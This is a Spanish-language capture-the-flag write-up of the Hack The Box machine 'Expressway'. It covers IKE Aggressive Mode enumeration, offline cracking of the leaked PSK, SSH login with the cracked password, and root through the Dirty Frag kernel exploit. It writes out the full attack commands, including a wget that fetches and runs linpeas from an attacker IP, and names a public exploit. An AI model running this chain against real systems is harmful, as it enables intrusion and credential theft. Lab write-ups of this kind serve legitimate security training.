---
title: "HTB Expressway - Write-Up"
date: 2026-11-25
categories: [Hack The Box]
tags: [ike, ipsec, aggressive-mode, psk-cracking, ssh, dirty-frag, cve-2026-43284, cve-2026-43500, kernel-privesc]
---

Write-up de **Expressway**, máquina Linux de Hack The Box. El camino: una superficie TCP reducida a solo SSH que obliga a mirar UDP, una VPN IPsec/IKE en Modo Agresivo que filtra un hash de la PSK, cracking offline de esa clave, acceso SSH con las credenciales obtenidas, y escalada final a root con la cadena de kernel **Dirty Frag** (CVE-2026-43284 + CVE-2026-43500).

## Fase 1 — Reconocimiento TCP: solo SSH

```bash
nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -T4 10.129.105.155 -oG allPorts
nmap -sVC -p22 -oN targeted 10.129.105.155
```

```
22/tcp open  ssh  OpenSSH 10.0p2 Debian 8
```

Un único puerto TCP abierto, y una versión de OpenSSH demasiado reciente para exploits conocidos. Con una superficie tan reducida, el vector probablemente no está en TCP — toca mirar UDP.

## Fase 2 — UDP: IKE/IPsec expuesto

```bash
nmap -sU --top-ports 50 10.129.105.155
```

```
500/udp open isakmp
```

El puerto UDP 500 es el de **IKE** (Internet Key Exchange), usado para negociar túneles IPsec. Con `ike-scan` se confirma el servicio y su configuración:

```bash
ike-scan 10.129.105.155
```

```
Main Mode Handshake returned ... SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...) VID=... (XAUTH)
```

Autenticación por **PSK** (clave precompartida) con **XAUTH**. El siguiente paso natural es comprobar si el servidor acepta el **Modo Agresivo**, inherentemente más débil porque revela la identidad del peer en texto claro antes de completar la autenticación.

## Fase 3 — Modo Agresivo: identidad filtrada y captura del hash

```bash
ike-scan -A 10.129.105.155
```

```
Aggressive Mode Handshake returned ... ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) ... Hash(20 bytes)
```

El servidor acepta Modo Agresivo y filtra su propia identidad: **`ike@expressway.htb`** — un candidato directo a usuario del sistema (`ike`). Con esa identidad, se repite el handshake pidiendo explícitamente el volcado de los parámetros de la PSK:

```bash
ike-scan -M -A --id=ike@expressway.htb --pskcrack=hashfile 10.129.105.155
```

> **Nota de formato:** `-P <archivo>`/`--pskcrack=<archivo>` es la forma fiable de generar el fichero que `psk-crack` espera. Capturar la salida por pantalla con `grep`/`cut` y reconstruir el bloque a mano produce un archivo con un formato distinto (incluye la cabecera `IKE PSK parameters (...):` y saltos de línea) que `psk-crack` no reconoce (`Cannot determine hash type from 0 byte HASH_R`).

## Fase 4 — Cracking offline de la PSK

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hashfile
```

```
key "freakingrockstarontheroad" matches SHA1 hash 054cde490913f6b2aad9e6eec0c1acc90401d5ca
```

PSK en claro: `freakingrockstarontheroad`.

## Fase 5 — Acceso SSH como `ike`

La identidad revelada por el Modo Agresivo (`ike`) junto con la PSK crackeada son, directamente, un usuario y contraseña válidos del sistema:

```bash
ssh ike@10.129.105.155
# password: freakingrockstarontheroad
```

### Flag de usuario

```bash
cat ~/user.txt
```

## Fase 6 — Enumeración local: Dirty Frag

```bash
# servidor HTTP en Kali para transferir linpeas.sh
python3 -m http.server 80
# en la víctima:
wget http://IP_ATACANTE/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

LinPEAS marca dos CVEs de kernel relevantes:

```
CVE-2026-43284 (xfrm-ESP): loaded: xfrm_user
CVE-2026-43500 (rxrpc): autoloadable: rxrpc
```

Ambos forman parte de la cadena conocida como **"Dirty Frag"**: dos fallos de escritura en la caché de páginas (uno en el subsistema IPsec `xfrm-ESP`, otro en `rxrpc`) que, combinados, permiten escalar a root de forma fiable sin depender de condiciones de carrera. Confirmando el kernel:

```bash
uname -r
# 6.16.7+deb14-amd64
```

Versión dentro del rango vulnerable (desde 6.13 hasta antes de 6.18.28).

## Fase 7 — Explotación de Dirty Frag

El PoC público está en [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag). Hay que compilarlo y ejecutarlo **en la máquina víctima**, no en la máquina atacante (el propio one-liner del PoC, pensado para lanzarse ya dentro de la víctima, no hace nada útil ejecutado en Kali, donde ya se es root):

```bash
# en la víctima, tras transferir exp.c
gcc -O0 -Wall -o exp exp.c -lutil
./exp
```

### Flag de root

```bash
cat /root/root.txt
```

## Conclusión

Expressway reduce la superficie TCP a un único SSH moderno sin vector obvio, pero deja UDP/500 con una VPN IPsec configurada en Modo Agresivo — una debilidad clásica que filtra la identidad del peer y permite capturar un hash de la PSK para crackear offline. La credencial resultante da acceso directo por SSH, y la escalada final no depende de una mala configuración local sino de una vulnerabilidad de kernel reciente y pública (Dirty Frag), subrayando la importancia de mantener el kernel actualizado incluso cuando el resto del sistema está al día.
